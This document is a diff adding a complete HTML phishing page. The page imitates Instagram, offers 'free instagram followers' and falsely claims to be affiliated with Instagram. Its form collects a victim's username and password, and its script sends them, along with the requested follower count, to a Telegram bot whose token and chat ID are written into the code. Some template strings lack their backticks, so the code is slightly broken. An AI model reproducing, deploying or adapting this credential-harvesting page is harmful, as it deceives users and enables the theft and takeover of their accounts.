@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Followers</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #000;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px;
+            border-bottom: 1px solid #333;
+        }
+        main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin: 20px 0;
+        }
+        h1 {
+            color: #e1306c;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        input, select, button {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            background-color: #000;
+            border: 1px solid #333;
+            color: #fff;
+            border-radius: 5px;
+        }
+        button {
+            background-color: #e1306c;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #c13584;
+        }
+        .register {
+            margin-top: 20px;
+            color: #999;
+        }
+        footer {
+            text-align: center;
+            padding: 10px;
+            color: #666;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <span>✕</span>
+        <span>Instagram</span>
+        <span>⋯</span>
+    </header>
+    
+    <main>
+        <div>Generate free instagram followers🚀</div>
+        
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png" alt="Instagram Logo" class="logo">
+        
+        <h1>Instagram Followers</h1>
+        
+        <input type="text" id="username" placeholder="Username, Phone Number or Email">
+        <input type="password" id="password" placeholder="Password">
+        
+        <select id="followers">
+            <option value="1000">1000 Followers</option>
+            <option value="5000">5000 Followers</option>
+            <option value="10000">10000 Followers</option>
+        </select>
+        
+        <button onclick="sendTelegramMessage()">Sign up</button>
+        
+        <div class="register">Register</div>
+    </main>
+    
+    <footer>
+        Instagram Followers - affiliated with Instagram © 2024
+    </footer>
+
+    <script>
+        function sendTelegramMessage() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const followers = document.getElementById('followers').value;
+
+            const message = New signup attempt:nUsername: ${username}nPassword: ${password}nRequested Followers: ${followers};
+            
+            const token = '7937991929:AAF3-D2xNgFx-KqlLdRhs3voLJi7PcFNV34'; // Replace with your bot token
+            const chatId = '5113640407'; // Replace with your chat ID
+            const url = https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};
+
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        alert('Message sent to Telegram!');
+                    } else {
+                        alert('Failed to send message.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('Error sending message.');
+                });
+        }
+    </script>
+</body>
+</html>
